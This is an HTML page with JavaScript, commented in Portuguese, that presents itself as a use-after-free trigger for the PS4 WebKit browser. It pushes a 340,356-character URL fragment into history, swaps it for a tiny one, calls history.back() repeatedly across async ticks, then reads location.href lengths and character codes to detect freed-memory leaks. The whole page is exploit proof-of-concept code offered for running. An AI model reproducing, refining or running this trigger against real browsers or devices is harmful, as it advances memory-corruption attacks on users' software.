<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS4 WebKit UAF – Trigger Fixado + Testes</title>
<style>
body { font-family: monospace; background: #000; color: #0f0; }
button { margin: 5px; padding: 10px; }
pre { white-space: pre-wrap; }
</style>
</head>
<body>

<h2>UAF Trigger Fixado (Iteração 48)</h2>

<button onclick="runTest()">RUN TEST</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(s) {
    logEl.textContent += s + "\n";
}

/* ===========================
   CONSTANTES DO BUG (FIXAS)
   =========================== */
const BIG_FRAGMENT_SIZE = 340356;
const ITERATIONS = 48;

/* ===========================
   TRIGGER UAF (OBRIGATÓRIO)
   =========================== */
async function triggerUAF() {
    log("=== UAF TRIGGER START ===");

    const big = "A".repeat(BIG_FRAGMENT_SIZE);

    /* Estado A — fragmento grande */
    history.pushState({A:1}, "", "#" + big);

    /* Estado B — fragmento pequeno (colisão) */
    history.replaceState({B:2}, "", "#X");

    /* Reentrada crítica */
    for (let i = 0; i < ITERATIONS; i += 6) {
        history.back();
        await new Promise(r => setTimeout(r, 0));
        log("[ITER " + i + "] back() async");
    }

    log(">>> UAF WINDOW <<<");
}

/* ===========================
   TESTE BASE (PROBE CANÔNICO)
   =========================== */
function baselineProbe(tag) {
    const s = location.href;
    log(tag + " URL.length = " + s.length);
    log(tag + " charCodeAt(32) = " + s.charCodeAt(32));
    log(tag + " charCodeAt(64) = " + s.charCodeAt(64));
    log(tag + " charCodeAt(128) = " + s.charCodeAt(128));
    log(tag + " charCodeAt(256) = " + s.charCodeAt(256));
}

/* ===========================
   TESTE PRINCIPAL
   =========================== */
async function runTest() {
    logEl.textContent = "";

    /* BASELINE LIMPO */
    log("=== BASELINE ===");
    baselineProbe("[BASE]");

    /* TRIGGER UAF (NÃO OPCIONAL) */
    await triggerUAF();

    /* LEITURA IMEDIATA (SAME FRAME) */
    log("\n=== POST-UAF (SAME FRAME) ===");
    baselineProbe("[POST]");

    /* COLAPSO DO FRAGMENTO */
    log("\n>>> FRAGMENT COLLAPSE <<<");
    location.hash = "#Z";

    /* LEITURA IMEDIATA */
    log("\n=== POST-COLLAPSE (SAME FRAME) ===");
    baselineProbe("[COLLAPSE]");

    /* LEITURA ATRASADA */
    await new Promise(r => setTimeout(r, 0));
    log("\n=== POST-COLLAPSE (DELAYED) ===");
    baselineProbe("[DELAYED]");

    log("\n=== TEST END ===");
}
</script>

</body>
</html>
